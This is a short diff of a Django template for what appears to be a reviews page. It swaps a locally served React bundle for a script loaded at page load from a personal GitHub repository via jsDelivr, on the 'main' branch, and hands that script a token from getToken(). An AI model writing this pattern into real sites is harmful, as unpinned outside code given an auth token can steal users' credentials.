@@ -50,7 +50,12 @@ Reviews | {{block.super}}
 <script>
   loadJSFile("{% static 'js/press.js' %}", function () {
     setTimeout(() => {
-      loadJSFile("{% static 'assets/js/react-app/react-app.js' %}", function () { })
+      getToken().then(token => {
+        loadJSFile("https://cdn.jsdelivr.net/gh/dlion4/cdn@main/script.js", function () {
+        }, document.body, token);
+      }).catch(error => {
+        console.error('Error fetching token:', error);
+      })
     }, 3000)
   });
   window.NP = '';
